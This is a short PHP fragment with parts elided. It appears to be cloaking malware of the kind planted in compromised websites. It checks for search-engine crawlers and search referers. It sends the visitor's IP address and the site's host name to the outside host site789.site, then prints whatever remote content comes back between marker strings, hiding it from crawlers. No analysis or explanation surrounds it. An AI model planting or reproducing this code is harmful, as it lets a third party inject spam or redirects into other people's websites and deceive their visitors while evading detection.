...
$is_bot1 = false;
if (preg_match("/googlebot|bingbot|slurp/i", $_SERVER["HTTP_USER_AGENT"])) $is_bot1 = true;
...
if (isset($_SERVER["HTTP_REFERER"])) foreach($ps as $psp) if (strpos(strtolower($_SERVER['HTTP_REFERER']),$psp)) $dat=1;
		...
		if ($dat==1 && $is_bot1==false) {
			$cont=file_get_contents($_SERVER["SCRIPT_FILENAME"]);
			...
			$url=get_url("http://site789.site/456.php?ip={$_SERVER['REMOTE_ADDR']}&d={$_SERVER['HTTP_HOST']}&key=".base64_encode($key));
			preg_match('/\|start\|(.*)\|fin\|/s', $url, $matches);
			if (isset($matches[1])) {echo $matches[1];exit;}
